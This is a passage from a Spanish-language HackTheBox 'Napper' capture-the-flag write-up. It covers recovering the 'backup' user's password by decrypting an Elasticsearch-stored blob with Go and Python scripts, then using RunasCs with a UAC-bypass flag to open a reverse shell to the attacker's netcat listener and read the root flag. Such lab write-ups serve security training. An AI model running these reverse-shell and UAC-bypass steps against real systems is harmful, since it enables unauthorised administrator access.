+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80</span><span><span style="color:#007f7f"></span>	plaintext := <span style="color:#fff;font-weight:bold">make</span>([]<span style="color:#fff;font-weight:bold">byte</span>, <span style="color:#fff;font-weight:bold">len</span>(ciphertextBytes))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81</span><span>	stream.XORKeyStream(plaintext, ciphertextBytes)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83</span><span>	<span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">string</span>(plaintext), <span style="color:#fff;font-weight:bold">nil</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86</span><span><span style="color:#fff;font-weight:bold">func</span> main() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87</span><span>	seed,blob,err := getSeedAndBlob()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89</span><span>		fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Error: &#34;</span>, err)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90</span><span>		<span style="color:#fff;font-weight:bold">return</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92</span><span>	fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Seed: &#34;</span>, seed)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93</span><span>	fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Blob: &#34;</span>, blob)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94</span><span>	plaintext, err := decrypt(seed, blob)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95</span><span>	<span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96</span><span>		fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Decryption error:&#34;</span>, err)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97</span><span>		<span style="color:#fff;font-weight:bold">return</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98</span><span>	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100</span><span>	fmt.Println(<span style="color:#0ff;font-weight:bold">&#34;Decrypted plaintext:&#34;</span>, plaintext)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101</span><span>}</span></span></code></pre></div>
+<p>Este script utiliza otro script en python llamado <code>getData.py</code> que simplemente hace una petición para conseguir el valor de <code>seed</code> y <code>blob</code> utilizando las credenciales anteriormente conseguidas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#007f7f"># getData.py</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">import</span> urllib3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>urllib3.disable_warnings()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>URL = <span style="color:#0ff;font-weight:bold">&#34;https://127.0.0.1:9200/_search?pretty=true&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>user = <span style="color:#0ff;font-weight:bold">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>pwd = <span style="color:#0ff;font-weight:bold">&#34;DumpPassword$Here&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>r = requests.get(URL, auth=(user, pwd), verify=<span style="color:#fff;font-weight:bold">False</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>json_response = r.json()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>seed_value = json_response[<span style="color:#0ff;font-weight:bold">&#39;hits&#39;</span>][<span style="color:#0ff;font-weight:bold">&#39;hits&#39;</span>][<span style="color:#ff0;font-weight:bold">0</span>][<span style="color:#0ff;font-weight:bold">&#39;_source&#39;</span>][<span style="color:#0ff;font-weight:bold">&#39;seed&#39;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>blob_value = json_response[<span style="color:#0ff;font-weight:bold">&#39;hits&#39;</span>][<span style="color:#0ff;font-weight:bold">&#39;hits&#39;</span>][<span style="color:#ff0;font-weight:bold">1</span>][<span style="color:#0ff;font-weight:bold">&#39;_source&#39;</span>][<span style="color:#0ff;font-weight:bold">&#39;blob&#39;</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span><span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{</span>seed_value<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">|</span><span style="color:#0ff;font-weight:bold">{</span>blob_value<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)</span></span></code></pre></div>
+<p>Al ejecutar el script&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ go run pass.go 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Seed:  41025560
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Blob:  cMhkWTlT3MddLGL7ZzdusdiuHtKDKZwWmw4idmKoehp6mI7_L2PZ_MLAwN1JgW54jhEesmZlNdM=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Decrypted plaintext: fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq
+</span></span></code></pre></div>
+<p>En principio la credencial del usuario <code>backup</code> es <code>fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq</code></p>
+<p>¡Y conseguimos ejecutar comandos como <code>backup</code>!</p>
+<p>Eso fue bastante complicado&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\ProgramData&gt;.\RunasCs.exe backup fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq &#34;cmd /c whoami&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[*] Warning: The logon for user &#39;backup&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>napper\backup
+</span></span></code></pre></div>
+<p>Ahora nos podemos mandar una revshell como este usuario.</p>
+<p><strong>El propio <code>RunasCs.exe</code> nos está avisando de que usemos la flag &ndash;bypass-uac y &ndash;logon-type 8 para conseguir un token mas privilegiado para el proceso</strong></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\ProgramData&gt;.\RunasCs.exe backup qGTwMxgZpboSlSJiYGqfSdBXmgtaVRAGWIsPdfVb cmd.exe -r 10.10.14.125:443 --bypass-uac --logon-type 8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[+] Running in session 0 with process function CreateProcessWithLogonW()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Using Station\Desktop: Service-0x0-42cb7$\Default
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 4196 created in background.
+</span></span></code></pre></div>
+<p>Si estamos en escucha con <code>netcat</code> por el puerto 443.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.125] from (UNKNOWN) [10.129.229.166] 57370
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 10.0.19045.3636]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>(c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00"></span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>napper\backup
+</span></span></code></pre></div>
+<p>Podemos comprobar que pertenecemos al grupo de <code>Administrators</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:\Users\Administrator\Desktop&gt;net user backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>net user backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>User name                    backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Full Name                    backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Comment                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>User&#39;s comment               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Country/region code          000 (System Default)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Account active               Yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Account expires              Never
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#f00"></span>Password last set            8/27/2024 8:43:22 AM
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Password expires             Never
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Password changeable          8/27/2024 8:43:22 AM
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Password required            Yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>User may change password     Yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span><span style="color:#f00"></span>Workstations allowed         All
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Logon script                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>User profile                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>Home directory               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>Last logon                   8/27/2024 8:45:05 AM
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span><span style="color:#f00"></span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span><span style="color:#f00"></span>Local Group Memberships      *Administrators       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>Global Group memberships     *None                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>The command completed successfully.
+</span></span></code></pre></div>
+<p>Por lo cual nos hemos convertido en administradores del sistema y podemos leer la flag de <code>root</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>type root.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>fc9a5f7c77d0a1...
+</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+
+  </content>
+  <p>
+    
+      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
+    
+      <a href="/tags/napper/">#Napper</a>&nbsp;&nbsp;
+    
+      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
+    
+      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
+    
+      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
+    
+      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
+    
+      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
+    
+      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
+    
+      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
+    
+      <a href="/tags/windows/">#Windows</a>&nbsp;&nbsp;
+    
+      <a href="/tags/https-enumeration/">#HTTPS Enumeration</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ssl-certificate-inspection/">#SSL Certificate Inspection</a>&nbsp;&nbsp;
+    
+      <a href="/tags/information-leakage/">#Information Leakage</a>&nbsp;&nbsp;
+    
+      <a href="/tags/naplistener/">#NAPLISTENER</a>&nbsp;&nbsp;
+    
+      <a href="/tags/rerverse-port-forwarding/">#Rerverse Port Forwarding</a>&nbsp;&nbsp;
+    
+      <a href="/tags/elasticdb-enumeration/">#ElasticDB Enumeration</a>&nbsp;&nbsp;
+    
+      <a href="/tags/reversing-engineering/">#Reversing Engineering</a>&nbsp;&nbsp;
+    
+      <a href="/tags/reversing/">#Reversing</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ghidra/">#GHidra</a>&nbsp;&nbsp;
+    
+      <a href="/tags/go-scripting/">#Go Scripting</a>&nbsp;&nbsp;
+    
+      <a href="/tags/python-scripting/">#Python Scripting</a>&nbsp;&nbsp;
+    
+      <a href="/tags/scripting/">#Scripting</a>&nbsp;&nbsp;
+    
+      <a href="/tags/decrypting/">#Decrypting</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+  <span>© 2024 pointedsec</span>
+
+
+
+    </footer>
+
+    
+</body>
+</html>
